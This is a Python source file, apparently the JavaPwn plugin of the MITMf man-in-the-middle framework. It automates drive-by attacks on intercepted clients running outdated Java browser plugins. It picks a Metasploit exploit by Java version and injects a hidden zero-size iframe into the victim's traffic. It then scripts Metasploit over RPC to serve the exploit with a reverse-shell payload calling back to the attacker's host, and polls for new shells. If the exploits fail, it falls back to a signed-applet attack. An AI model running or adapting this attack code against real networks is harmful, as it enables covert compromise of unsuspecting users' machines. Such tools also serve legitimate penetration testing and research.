#!/usr/bin/env python2.7

# Copyright (c) 2014-2016 Marcello Salvati
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import core.msfrpc as msfrpc
import string
import random
import threading
import sys
import logging

from plugins.plugin import Plugin
from plugins.BrowserProfiler import BrowserProfiler
from time import sleep

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  #Gets rid of IPV6 Error when importing scapy
from scapy.all import get_if_addr

requests_log = logging.getLogger("requests")  #Disables "Starting new HTTP Connection (1)" log message
requests_log.setLevel(logging.WARNING)

mitmf_logger = logging.getLogger('mitmf')

class JavaPwn(BrowserProfiler, Plugin):
    name     = "JavaPwn"
    optname  = "javapwn"
    desc     = "Performs drive-by attacks on clients with out-of-date java browser plugins"
    depends  = ["Browserprofiler"]
    version  = "0.3"
    has_opts = False

    def initialize(self, options):
        '''Called if plugin is enabled, passed the options namespace'''
        self.options      = options
        self.msfip        = options.ip_address
        self.sploited_ips = []  #store ip of pwned or not vulnerable clients so we don't re-exploit

        try:
            msfcfg       = options.configfile['MITMf']['Metasploit']
        except Exception, e:
            sys.exit("[-] Error parsing Metasploit options in config file : " + str(e))
        
        try:
            self.javacfg = options.configfile['JavaPwn']
        except Exception, e:
            sys.exit("[-] Error parsing config for JavaPwn: " + str(e))

        self.msfport = msfcfg['msfport']
        self.rpcip   = msfcfg['rpcip']
        self.rpcpass = msfcfg['rpcpass']

        #Initialize the BrowserProfiler plugin
        BrowserProfiler.initialize(self, options)
        self.black_ips = []

        try:
            msf = msfrpc.Msfrpc({"host": self.rpcip})  #create an instance of msfrpc libarary
            msf.login('msf', self.rpcpass)
            version = msf.call('core.version')['version']
            self.output.append("Connected to Metasploit v%s" % version)
        except Exception:
            sys.exit("[-] Error connecting to MSF! Make sure you started Metasploit and its MSGRPC server")

        t = threading.Thread(name='pwn', target=self.pwn, args=(msf,))
        t.setDaemon(True)
        t.start()  #start the main thread

    def rand_url(self):  #generates a random url for our exploits (urls are generated with a / at the beginning)
        return "/" + ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(5))

    def get_exploit(self, java_version):
        exploits = []

        client_vstring = java_version[:-len(java_version.split('.')[3])-1]
        client_uversion = int(java_version.split('.')[3])

        for ver in self.javacfg['Multi'].iteritems():
            if type(ver[1]) is list:
                for list_vers in ver[1]:
                    
                    version_string = list_vers[:-len(list_vers.split('.')[3])-1]
                    update_version = int(list_vers.split('.')[3])
                    
                    if ('*' in version_string[:1]) and (client_vstring == version_string[1:]):
                        if client_uversion == update_version:
                            exploits.append(ver[0])
                    elif (client_vstring == version_string):
                        if client_uversion <= update_version:
                            exploits.append(ver[0])
            else:
                version_string = ver[1][:-len(ver[1].split('.')[3])-1]
                update_version = int(ver[1].split('.')[3])

                if ('*' in version_string[:1]) and (client_vstring == version_string[1:]):
                    if client_uversion == update_version:
                        exploits.append(ver[0])
                elif client_vstring == version_string:
                    if client_uversion <= update_version:
                        exploits.append(ver[0])

        return exploits


    def injectWait(self, msfinstance, url, client_ip):  #here we inject an iframe to trigger the exploit and check for resulting sessions
        #inject iframe
        mitmf_logger.info("%s >> now injecting iframe to trigger exploit" % client_ip)
        self.html_payload = "<iframe src='http://%s:%s%s' height=0%% width=0%%></iframe>" % (self.msfip, self.msfport, url) #temporarily changes the code that the Browserprofiler plugin injects

        mitmf_logger.info('%s >> waiting for ze shellz, Please wait...' % client_ip)

        exit = False
        i = 1
        while i <= 30:  #wait max 60 seconds for a new shell
            if exit:
                break
            shell = msfinstance.call('session.list')  #poll metasploit every 2 seconds for new sessions
            if len(shell) > 0:
                for k, v in shell.iteritems():
                    if client_ip in shell[k]['tunnel_peer']:  #make sure the shell actually came from the ip that we targeted
                        mitmf_logger.info("%s >> Got shell!" % client_ip)
                        self.sploited_ips.append(client_ip)  #target successfuly exploited :)
                        self.black_ips = self.sploited_ips   #Add to inject blacklist since box has been popped
                        exit = True
                        break
            sleep(2)
            i += 1

        if exit is False:  #We didn't get a shell :(
            mitmf_logger.info("%s >> session not established after 30 seconds" % client_ip)

        self.html_payload = self.get_payload()  # restart the BrowserProfiler plugin

    def send_command(self, cmd, msf, vic_ip):
        try:
            mitmf_logger.info("%s >> sending commands to metasploit" % vic_ip)

            #Create a virtual console
            console_id = msf.call('console.create')['id']

            #write the cmd to the newly created console
            msf.call('console.write', [console_id, cmd])

            mitmf_logger.info("%s >> commands sent succesfully" % vic_ip)
        except Exception, e:
            mitmf_logger.info('%s >> Error accured while interacting with metasploit: %s:%s' % (vic_ip, Exception, e))  

    def pwn(self, msf):
        while True:
            if (len(self.dic_output) > 0) and self.dic_output['java_installed'] == '1':  #only choose clients that we are 100% sure have the java plugin installed and enabled

                brwprofile = self.dic_output  #self.dic_output is the output of the BrowserProfiler plugin in a dictionary format

                if brwprofile['ip'] not in self.sploited_ips:  #continue only if the ip has not been already exploited

                    vic_ip = brwprofile['ip']

                    mitmf_logger.info("%s >> client has java version %s installed! Proceeding..." % (vic_ip, brwprofile['java_version']))
                    mitmf_logger.info("%s >> Choosing exploit based on version string" % vic_ip)

                    exploits = self.get_exploit(brwprofile['java_version']) # get correct exploit strings defined in javapwn.cfg

                    if exploits:

                        if len(exploits) > 1:
                            mitmf_logger.info("%s >> client is vulnerable to %s exploits!" % (vic_ip, len(exploits)))
                            exploit = random.choice(exploits)
                            mitmf_logger.info("%s >> choosing %s" %(vic_ip, exploit))
                        else:
                            mitmf_logger.info("%s >> client is vulnerable to %s!" % (vic_ip, exploits[0]))
                            exploit = exploits[0]

                        #here we check to see if we already set up the exploit to avoid creating new jobs for no reason
                        jobs = msf.call('job.list')  #get running jobs
                        if len(jobs) > 0:
                            for k, v in jobs.iteritems():
                                info = msf.call('job.info', [k])
                                if exploit in info['name']:
                                    mitmf_logger.info('%s >> %s already started' % (vic_ip, exploit))
                                    url = info['uripath']  #get the url assigned to the exploit
                                    self.injectWait(msf, url, vic_ip)

                        else:  #here we setup the exploit
                            rand_port = random.randint(1000, 65535)  #generate a random port for the payload listener
                            rand_url = self.rand_url()
                            #generate the command string to send to the virtual console
                            #new line character very important as it simulates a user pressing enter
                            cmd = "use exploit/%s\n" % exploit
                            cmd += "set SRVPORT %s\n" % self.msfport
                            cmd += "set URIPATH %s\n" % rand_url
                            cmd += "set PAYLOAD generic/shell_reverse_tcp\n"  #chose this payload because it can be upgraded to a full-meterpreter and its multi-platform
                            cmd += "set LHOST %s\n" % self.msfip
                            cmd += "set LPORT %s\n" % rand_port
                            cmd += "exploit -j\n"

                            mitmf_logger.debug("command string:\n%s" % cmd)

                            self.send_command(cmd, msf, vic_ip)

                            self.injectWait(msf, rand_url, vic_ip)
                    else:
                        #this might be removed in the future since newer versions of Java break the signed applet attack (unless you have a valid cert)
                        mitmf_logger.info("%s >> client is not vulnerable to any java exploit" % vic_ip)
                        mitmf_logger.info("%s >> falling back to the signed applet attack" % vic_ip)

                        rand_url = self.rand_url()
                        rand_port = random.randint(1000, 65535)

                        cmd = "use exploit/multi/browser/java_signed_applet\n"
                        cmd += "set SRVPORT %s\n" % self.msfport
                        cmd += "set URIPATH %s\n" % rand_url
                        cmd += "set PAYLOAD generic/shell_reverse_tcp\n"
                        cmd += "set LHOST %s\n" % self.msfip
                        cmd += "set LPORT %s\n" % rand_port
                        cmd += "exploit -j\n"

                        self.send_command(cmd, msf, vic_ip)
                        self.injectWait(msf, rand_url, vic_ip)
            sleep(1)

    def finish(self):
        '''This will be called when shutting down'''
        msf = msfrpc.Msfrpc({"host": self.rpcip})
        msf.login('msf', self.rpcpass)

        jobs = msf.call('job.list')
        if len(jobs) > 0:
            print '\n[*] Stopping all running metasploit jobs'
            for k, v in jobs.iteritems():
                msf.call('job.stop', [k])

        consoles = msf.call('console.list')['consoles']
        if len(consoles) > 0:
            print "[*] Closing all virtual consoles"
            for console in consoles:
                msf.call('console.destroy', [console['id']])
